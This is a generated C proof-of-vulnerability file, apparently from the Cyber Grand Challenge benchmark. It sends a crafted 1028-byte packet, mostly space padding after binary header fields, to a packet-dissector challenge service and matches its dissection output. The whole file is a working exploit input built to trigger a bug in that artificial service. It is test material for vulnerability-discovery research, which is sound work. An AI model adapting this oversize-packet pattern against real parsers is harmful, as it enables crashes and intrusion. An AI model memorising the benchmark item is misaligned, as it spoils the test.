#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x8c\x16\x77\x4a"
         "\xf8\xa6\x71\x21\xaa\x64\x3f\x5d\x90\x63\x41\x31\x49\x83\xce\x6a"
         "\x88\x01\x00\x00\xc4\x5e\x72\xee\x41\x2c\xab\xe6\x27\x3a\x5d\x5e"
         "\x86\xcc\x40\x84\x38\x0c\x93\x03\x14\xfd\x98\x7f\x24\x5d\x17\x27"
         "\x0a\x55\xa9\x79\xec\xdc\x94\x88\xad\x9a\x42\xa5\x5a\x58\x4c\x10"
         "\x21\x63\xd9\xd8\xbf\x85\x1d\x80\x0f\x0f\x0f\x0f\xe2\xd4\x69\x5b"
         "\x86\x58\x56\x9b\x0c\xa2\x5c\xd9\x34\x74\x55\x46\x4b\xf3\xc2\x73"
         "\x13\xf7\x45\x38\xd0\xde\x29\x73\x66\xd7\xb6\xa7\xf5\x40\x7a\x46"
         "\xea\xfd\x0e\x67\x3d\xf4\xe5\x24\x93\x2e\x91\xfb\x43\xd2\x5b\x4f"
         "\x13\x9a\xd3\x7c\x8f\xb8\x6e\x1a\xf9\x6d\x65\x81\x45\x35\x68\x0a"
         "\x17\x36\x7e\xdf\x44\xd3\xc1\x8b\xef\xad\xce\xcb\x13\xbc\x2b\x61"
         "\x9a\xd0\x03\xb5\x2a\x29\x0c\x07\x62\xb4\x60\x7b\xfc\xa7\xce\x77"
         "\x32\x04\xd0\xc1\x0b\x91\x77\x25\x9c\xa7\x9e\xb9\x01\x8f\x50\x56"
         "\x3b\x93\x64\x2d\x5f\x23\x3b\x8f\xb4\x53\x1b\x6f\xfe\xcd\xf5\xf6"
         "\x65\x84\xbc\x02\x74\xba\x3c\x9c\x6c\xc2\xfd\x2a\x8b\xbe\x83\x38"
         "\x29\xba\xbd\xf6\xde\x5a\x68\x79\x00\xa1\x76\x18\x60\xc7\xaa\x81"
         "\xdd\x6d\xe2\xb3\x3e\xee\x7a\xcd\xbe\xf7\x7b\x9d\x0f\x01\x49\x07"
         "\x49\x50\xe2\x61\x86\xeb\x7d\x9c\x07\x13\xa9\xc0\xb0\x96\xd6\xf3"
         "\x43\xfb\xba\x55\x18\x60\x95\x12\x2f\x3b\xbe\xde\x5d\xa4\x8b\x49"
         "\xc1\x8a\x81\x72\xc3\xa0\xcd\xc0\xd2\x10\xf8\x91\x95\x19\xa1\xc9"
         "\xc5\x54\x83\xb2\xa9\x2d\x64\x03\xd2\x06\xf1\x20\x77\x9b\x2e\x74"
         "\x25\x4c\xec\x0f\x0f\x00\x22\x02\x3e\x9b\x84\xfa\x3c\x2e\x8a\xb2"
         "\x33\x2c\xf6\x1e\x53\x9a\x5d\xad\x23\x77\x05\x11\x6f\xfc\x67\x62"
         "\x46\x33\x75\x81\x0d\xd2\x6d\xbe\x53\x62\x75\x5a\x30\x1b\xee\x56"
         "\x95\xb3\x7f\x7e\x48\x76\xfc\xb3\xbb\x9d\x7b\xd4\xe5\xc3\x37\x38"
         "\x54\x49\x45\x89\x89\x76\x2a\x60\x10\x35\x46\xb3\x61\x97\x13\x9d"
         "\x36\xa5\x5c\x82\x19\xae\xe7\x39\xf4\x18\xca\x1a\xf0\x46\xfb\x20"
         "\xb2\xc9\x3a\xd1\x9a\x86\x7a\x73\x7d\xf4\x6d\x84\x02\xc1\x9b\x01"
         "\x85\x9e\xbf\xe4\xec\x8c\x8e\xd7\x70\xaa\xe5\x53\xef\x81\x70\x0b"
         "\x6c\xf4\xb9\x29\x25\x9a\x5c\x4d\xe1\xcc\xec\x28\x8b\x50\xc3\x58"
         "\x50\xce\x13\x91\x8e\x87\x46\xf7\x95\xcb\x08\x8a\x12\x87\x42\x80"
         "\x67\xbb\xdf\x3a\xef\x97\x83\xe0\xcb\x6c\x15\x99\x62\xf1\x23\x65"
         "\x44\x73\xba\xd1\xe7\x5f\x95\xee\x78\x1d\x9c\x25\x62\xc4\x1f\x67"
         "\xd7\x6f\xf3\x19\x78\xa5\x8c\x78\xf0\xcc\x90\x2d\x68\x20\xaf\x59"
         "\xd9\x8d\x3d\x9d\xd4\xb8\xd3\x8c\x1e\xe1\xba\x1d\x8d\xde\x75\xcf"
         "\x77\xc8\xf2\xf8\x68\x99\xb0\xd1\x2b\x74\x98\xa7\xe1\xdf\x75\x21"
         "\x86\xfe\xc0\xdc\xb6\x98\x2c\x53\xb9\x8d\x2f\x3e\x46\x89\x93\x7e"
         "\x65\x97\x55\xaa\x7d\xbc\x76\x09\x3e\x91\x3f\xe0\x2f\x60\xe3\x53"
         "\xf6\x82\xef\xc0\x5a\x0d\x17\x4b\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===palatableJonesian
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x70\x61\x6c\x61\x74\x61\x62\x6c\x65\x4a\x6f"
         "\x6e\x65\x73\x69\x61\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
